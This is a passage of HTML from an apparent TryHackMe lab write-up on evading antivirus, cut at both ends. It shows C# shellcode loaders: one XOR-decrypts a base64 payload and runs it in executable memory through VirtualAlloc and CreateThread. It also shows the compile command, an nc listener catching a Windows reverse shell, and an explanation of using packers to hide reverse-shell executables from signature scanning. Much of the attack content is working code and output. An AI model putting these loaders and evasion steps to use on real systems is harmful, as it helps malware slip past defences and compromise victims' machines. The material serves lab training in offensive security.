style="color:#e3116c">&quot;qKDPSzN5UbvWEJQsxhsD8mM+uHNAwz9jPM57FAL....pEvWzJg3oE=&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> data </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Convert</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">FromBase64String</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dataBS64</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">string</span><span class="token plain"> key </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;THMK3y123!&quot;</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic">//Convert Key into bytes</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> keyBytes </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> Encoding</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">ASCII</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">GetBytes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">key</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> encoded </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">xor</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> keyBytes</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> codeAddr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UInt32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">encoded</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READWRITE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Marshal</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Copy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">encoded</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">IntPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">codeAddr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> encoded</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> threadId </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> parameter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> codeAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> parameter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> threadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">threadHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div></div></div></details>
<p>Note that we have merely combined a couple of really simple techniques that were detected when used separately. Still, the AV won&#x27;t complain about the payload this time, as the combination of both methods is not something it can analyze directly.</p>
<p>Let&#x27;s compile our payload with the following command on the Windows machine:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Compile Our Encrypted Payload</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> csc.exe EncStageless.cs</span><br></span></code></pre></div></div>
<p>Before running our payload, let&#x27;s set up an <code>nc</code> listener. After copying and executing our payload into the victim machine, we should get a connection back as expected:</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Set Up nc Listener</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">user@AttackBox$ </span><span class="token function" style="color:#d73a49">nc</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lvp</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">443</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Listening on </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">family </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">, port </span><span class="token number" style="color:#36acaa">443</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection from ip-10-10-139-83.eu-west-1.compute.internal </span><span class="token number" style="color:#36acaa">49817</span><span class="token plain"> received</span><span class="token operator" style="color:#393A34">!</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Microsoft Windows </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">Version </span><span class="token number" style="color:#36acaa">10.0</span><span class="token plain">.17763.1821</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">c</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2018</span><span class="token plain"> Microsoft Corporation. All rights reserved.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">C:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Windows</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">System3</span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<p>As you can see, simple adjustments are enough sometimes. Most of the time, any specific methods you find online won&#x27;t probably work out of the box as detection signatures may already exist for them. However, using a bit of imagination to customize any method could prove enough for a successful bypass.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Try to use this technique (combining encoding and encryption) on the THM Antivirus Check at <code>http://MACHINE_IP/</code>. Does it bypass the installed AV software? </summary><div><div class="collapsibleContent_i85q"><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">No answer needed</span><br></span></code></pre></div></div></div></div></details></div></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="task-9-packers">Task 9 Packers<a href="#task-9-packers" class="hash-link" aria-label="Direct link to Task 9 Packers" title="Direct link to Task 9 Packers" translate="no">​</a></h2>
<p>Another method to defeat disk-based AV detection is to use a packer. <strong>Packers</strong> are pieces of software that take a program as input and transform it so that its structure looks different, but their functionality remains exactly the same. Packers do this with two main goals in mind:</p>
<ul>
<li class="">Compress the program so that it takes up less space.</li>
<li class="">Protect the program from reverse engineering in general.</li>
</ul>
<p>Packers are commonly used by software developers who would like to protect their software from being reverse engineered or cracked. They achieve some level of protection by implementing a mixture of transforms that include compressing, encrypting, adding debugging protections and many others. As you may have already guessed, packers are also commonly used to obfuscate malware without much effort.</p>
<p>There&#x27;s quite a large number of packers out there, including UPX, MPRESS, Themida, and many others.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="packing-an-application">Packing an application<a href="#packing-an-application" class="hash-link" aria-label="Direct link to Packing an application" title="Direct link to Packing an application" translate="no">​</a></h3>
<p>While every packer operates differently, let&#x27;s look at a basic example of what a simple packer would do.</p>
<p>When an application is packed, it will be transformed in some way using a <strong>packing</strong> function. The packing function needs to be able to obfuscate and transform the original code of the application in a way that can be reasonably reversed by an <strong>unpacking</strong> function so that the original functionality of the application is preserved. While sometimes the packer may add some code (to make debugging the application harder, for example), it will generally want to be able to get back the original code you wrote when executing it.</p>
<p><img decoding="async" loading="lazy" alt="packers" src="/TryHackMe-CN/en/assets/images/image_20251107-190725-e4d1a7bcaa70cebf227a47a676245d15.png" width="1386" height="535" class="img_ev3q"></p>
<p>The packed version of the application will contain your packed application code. Since this new packed code is obfuscated, the application needs to be able to unpack the original code from it. To this end, the packer will embed a code stub that contains an unpacker and redirect the main entry point of the executable to it.</p>
<p>When your packed application gets executed, the following will happen:</p>
<p><img decoding="async" loading="lazy" alt="packers" src="/TryHackMe-CN/en/assets/images/image_20251107-190744-362c25ed4c631a26cdc548cd5e245ef7.png" width="1108" height="777" class="img_ev3q"></p>
<ol>
<li class="">The unpacker gets executed first, as it is the executable&#x27;s entry point.</li>
<li class="">The unpacker reads the packed application&#x27;s code.</li>
<li class="">The unpacker will write the original unpacked code somewhere in memory and direct the execution flow of the application to it.</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="packers-and-avs">Packers and AVs<a href="#packers-and-avs" class="hash-link" aria-label="Direct link to Packers and AVs" title="Direct link to Packers and AVs" translate="no">​</a></h3>
<p>By now, we can see how packers help bypass AV solutions. Let&#x27;s say you built a reverse shell executable, but the AV is catching it as malicious because it matches a known signature. In this case, using a packer will transform the reverse shell executable so that it doesn&#x27;t match any known signatures while on disk. As a result, you should be able to distribute your payload to any machine&#x27;s disk without much problem.</p>
<p>AV solutions, however, could still catch your packed application for a couple of reasons:</p>
<ul>
<li class="">While your original code might be transformed into something unrecognizable, remember that the packed executable contains a stub with the unpacker&#x27;s code. If the unpacker has a known signature, AV solutions might still flag any packed executable based on the unpacker stub alone.</li>
<li class="">At some point, your application will unpack the original code into memory so that it can be executed. If the AV solution you are trying to bypass can do in-memory scans, you might still be detected after your code is unpacked.</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="packing-our-shellcode">Packing our shellcode<a href="#packing-our-shellcode" class="hash-link" aria-label="Direct link to Packing our shellcode" title="Direct link to Packing our shellcode" translate="no">​</a></h3>
<p>Let&#x27;s start from a basic C# shellcode. You can also find this code in your Windows machine at <code>C:\Tools\CS Files\UnEncStagelessPayload.cs</code>:</p>
<details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> Full Payload Code (Click to read) </summary><div><div class="collapsibleContent_i85q"><div class="language-csharp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-csharp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Net</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Text</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Configuration</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Install</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Runtime</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">InteropServices</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">using</span><span class="token plain"> </span><span class="token namespace" style="opacity:0.7">System</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Security</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">Cryptography</span><span class="token namespace punctuation" style="opacity:0.7;color:#393A34">.</span><span class="token namespace" style="opacity:0.7">X509Certificates</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">class</span><span class="token plain"> </span><span class="token class-name">Program</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> size</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flAllocationType</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> flProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">IntPtr</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadAttributes</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwStackSize</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpStartAddress</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">IntPtr</span><span class="token plain"> param</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwCreationFlags</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> lpThreadId</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">[</span><span class="token attribute class-name">DllImport</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">(</span><span class="token attribute attribute-arguments string" style="color:#e3116c">&quot;kernel32&quot;</span><span class="token attribute attribute-arguments punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token return-type class-name">UInt32</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token class-name">IntPtr</span><span class="token plain"> hHandle</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> dwMilliseconds</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> MEM_COMMIT </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x1000</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">private</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token class-name">UInt32</span><span class="token plain"> PAGE_EXECUTE_READWRITE </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">public</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">static</span><span class="token plain"> </span><span class="token return-type class-name keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name keyword" style="color:#00009f">byte</span><span class="token class-name punctuation" style="color:#393A34">[</span><span class="token class-name punctuation" style="color:#393A34">]</span><span class="token plain"> shellcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token constructor-invocation class-name keyword" style="color:#00009f">byte</span><span class="token constructor-invocation class-name punctuation" style="color:#393A34">[</span><span class="token constructor-invocation class-name punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">0xfc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x48</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x83</span><span class="token punctuation" style="color:#393A34">,</span><span class="token range operator" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xda</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xff</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0xd5</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> codeAddr </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualAlloc</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">UInt32</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MEM_COMMIT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> PAGE_EXECUTE_READWRITE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Marshal</span><span class="token punctuation" style="color:#393A34">.</span><span class="token function" style="color:#d73a49">Copy</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">shellcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">IntPtr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">codeAddr</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> shellcode</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">UInt32</span><span class="token plain"> threadId </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token class-name">IntPtr</span><span class="token plain"> parameter </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> IntPtr</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">Zero</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> codeAddr</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> parameter</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">ref</span><span class="token 